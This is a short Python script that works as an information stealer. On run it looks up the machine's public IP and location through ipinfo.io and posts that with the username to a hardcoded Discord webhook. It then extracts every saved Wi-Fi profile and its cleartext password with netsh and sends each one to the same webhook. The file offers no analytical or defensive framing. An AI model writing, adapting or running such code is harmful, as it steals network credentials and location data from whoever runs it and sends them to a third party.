import requests
import getpass
import subprocess
import json
from urllib.request import urlopen
from tkinter import *
def ip():
    url ='http://ipinfo.io/json'
    response = urlopen(url)
    data =json.load(response)
    payload ={'content': f'{getpass.getuser()}s adress is {data}'}
    response =requests.post('https://discord.com/api/webhooks/1177291121068609697/nuBPadzoAmBYubSiqcueSAFry1p89vcRFs8K3MPWQSqEUxm1WMWOGAfpTA9Mqz_3E5VG',json=payload)
def inte():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('iso-8859-9').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]    
    for i in profiles:
     results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
     results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
     payload2 ={'content': "{:<30}|  {:<}".format(i, results[0])}
     try:
         print (payload2)
         response =requests.post('https://discord.com/api/webhooks/1177291121068609697/nuBPadzoAmBYubSiqcueSAFry1p89vcRFs8K3MPWQSqEUxm1WMWOGAfpTA9Mqz_3E5VG',json=payload2)
     except IndexError:
         print ("{:<30}|  {:<}".format(i, ""))      
ip()
inte()